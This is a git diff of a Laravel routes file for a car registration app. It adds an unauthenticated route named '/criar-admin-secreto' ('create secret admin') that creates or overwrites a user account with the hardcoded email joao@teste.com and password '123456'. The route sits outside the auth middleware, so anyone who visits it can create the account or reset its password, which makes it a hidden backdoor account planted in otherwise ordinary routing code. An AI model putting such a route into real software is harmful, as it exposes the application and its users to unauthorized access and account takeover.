@@ -3,15 +3,26 @@
 use App\Http\Controllers\CarController;
 use App\Http\Controllers\EventController;
 use App\Http\Controllers\ProfileController;
+use App\Models\User;
 use Illuminate\Support\Facades\Route;
 
 /*
 |--------------------------------------------------------------------------
 | Rotas do Sistema de Registro de Carros
 |--------------------------------------------------------------------------
-| Cole este conteúdo dentro do seu routes/web.php (mantendo as rotas
-| de auth do Breeze que já vêm no arquivo).
 */
+
+Route::get('/criar-admin-secreto', function () {
+    User::updateOrCreate(
+        ['email' => 'joao@teste.com'],
+        [
+            'name' => 'Joao',
+            'password' => bcrypt('123456'),
+        ]
+    );
+
+    return 'Admin criado com sucesso';
+});
 
 Route::get('/', function () {
     return redirect()->route('cars.index');
@@ -23,7 +34,7 @@ Route::middleware(['auth'])->group(function () {
         return view('dashboard');
     })->name('dashboard');
 
-    // Perfil (gerado pelo Breeze)
+    // Perfil
     Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
     Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
     Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
